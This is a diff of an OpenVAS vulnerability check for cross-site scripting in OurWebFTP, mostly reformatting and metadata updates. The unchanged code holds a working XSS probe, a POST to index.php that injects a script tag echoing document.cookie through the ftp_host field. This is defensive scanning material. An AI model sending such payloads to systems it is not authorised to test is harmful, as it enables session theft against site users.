@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ourwebftp_mult_xss_vuln.nasl 5814 2017-03-31 09:13:55Z cfi $
+# $Id: gb_ourwebftp_mult_xss_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
 #
 # OurWebFTP Multiple Cross Site Scripting Vulnerabilities
 #
@@ -28,18 +28,18 @@ if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803117");
   script_bugtraq_id(56763);
-  script_version("$Revision: 5814 $");
+  script_version("$Revision: 11374 $");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-31 11:13:55 +0200 (Fri, 31 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-12-03 14:58:31 +0530 (Mon, 03 Dec 2012)");
   script_name("OurWebFTP Multiple Cross Site Scripting Vulnerabilities");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/51449/");
-  script_xref(name : "URL" , value : "https://www.httpcs.com/advisory/httpcs112");
-  script_xref(name : "URL" , value : "https://www.httpcs.com/advisory/httpcs113");
-  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/51449");
-  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Dec/24");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118531/ourwebftp-xss.txt");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/51449/");
+  script_xref(name:"URL", value:"https://www.httpcs.com/advisory/httpcs112");
+  script_xref(name:"URL", value:"https://www.httpcs.com/advisory/httpcs113");
+  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/51449");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Dec/24");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118531/ourwebftp-xss.txt");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
@@ -48,22 +48,19 @@ if(description)
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary
+  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
   HTML and script code in a user's browser session in the context of a vulnerable
   site. This may allow the attacker to steal cookie-based authentication
-  credentials and to launch other attacks.
-
-  Impact Level: Application");
-  script_tag(name : "affected" , value : "OurWebFTP version 5.3.5 and prior");
-  script_tag(name : "insight" , value : "Input passed via the 'ftp_host' and 'ftp_user' POST parameters
+  credentials and to launch other attacks.");
+  script_tag(name:"affected", value:"OurWebFTP version 5.3.5 and prior");
+  script_tag(name:"insight", value:"Input passed via the 'ftp_host' and 'ftp_user' POST parameters
   to index.php is not properly sanitised before being returned to the user. This
   can be exploited to execute arbitrary HTML and script code in a user's browser
   session in context of an affected site.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is installed with OurWebFTP and is prone to multiple
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is installed with OurWebFTP and is prone to multiple
   cross site scripting vulnerabilities.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -98,12 +95,10 @@ foreach dir (make_list_unique("/ourwebftp", "/", cgi_dirs(port:port)))
 
   if( res =~ "HTTP/1.. 200" && ">OurWebFTP" >< res && ">Online FTP Login<" >< res ) {
 
-    ## Construct the POST data
     postdata = "ftp_host=%3Cscript%3Ealert%28document.cookie%29%3C%2F" +
                "script%3E&ftp_user=&ftp_pass=&dir=&mwa_control2=op%3" +
                "Alogin&mwb_control2=Enter";
 
-    ## Construct the POST request
     req = string("POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
@@ -112,7 +107,6 @@ foreach dir (make_list_unique("/ourwebftp", "/", cgi_dirs(port:port)))
                  "\r\n", postdata);
     res = http_keepalive_send_recv(port:port, data:req);
 
-    ## Confirm exploit worked by checking the response
     if(res =~ "HTTP/1\.. 200" && res && '<script>alert(document.cookie)</script>' >< res &&
        '>Unable to connect to FTP server <' >< res)
     {
